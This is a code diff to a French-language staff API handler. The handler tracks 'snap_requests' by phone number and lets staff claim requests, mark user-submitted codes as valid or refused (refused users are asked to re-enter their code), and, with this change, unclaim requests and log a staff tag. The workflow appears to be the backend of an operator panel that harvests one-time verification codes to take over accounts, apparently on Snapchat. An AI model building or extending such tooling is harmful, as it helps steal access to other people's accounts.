@@ -11,7 +11,7 @@ export default async function handler(req, res) {
     const blocked = await checkBannedIP(req, res);
     if (blocked) return blocked;
 
-    const { action, phone, length, secret } = req.body;
+    const { action, phone, length, secret, staff_tag } = req.body;
     if (secret !== process.env.STAFF_SECRET) {
       return res.status(401).json({ success: false, message: 'Unauthorized' });
     }
@@ -20,6 +20,7 @@ export default async function handler(req, res) {
 
     if (action === 'claim') {
       await sql`UPDATE snap_requests SET status = 'processing' WHERE phone = ${phone}`;
+      await sql`INSERT INTO snap_logs (action, details) VALUES ('claim', ${JSON.stringify({ phone, staff_tag })})`;
       return res.status(200).json({ success: true, message: 'Prise en charge confirmée' });
     }
 
@@ -38,12 +39,18 @@ export default async function handler(req, res) {
 
     if (action === 'true_code') {
       await sql`UPDATE snap_requests SET status = 'completed' WHERE phone = ${phone}`;
+      await sql`INSERT INTO snap_logs (action, details) VALUES ('true_code', ${JSON.stringify({ phone, staff_tag })})`;
       return res.status(200).json({ success: true, message: 'Code validé par le staff' });
     }
 
     if (action === 'false_code') {
       await sql`UPDATE snap_requests SET status = 'retry_code' WHERE phone = ${phone}`;
       return res.status(200).json({ success: true, message: 'Code refusé, utilisateur invité à ressaisir' });
+    }
+
+    if (action === 'unclaim') {
+      await sql`UPDATE snap_requests SET status = 'pending' WHERE phone = ${phone}`;
+      return res.status(200).json({ success: true, message: 'Request unclaimed and returned to pending' });
     }
 
     return res.status(400).json({ success: false, message: 'Action inconnue' });
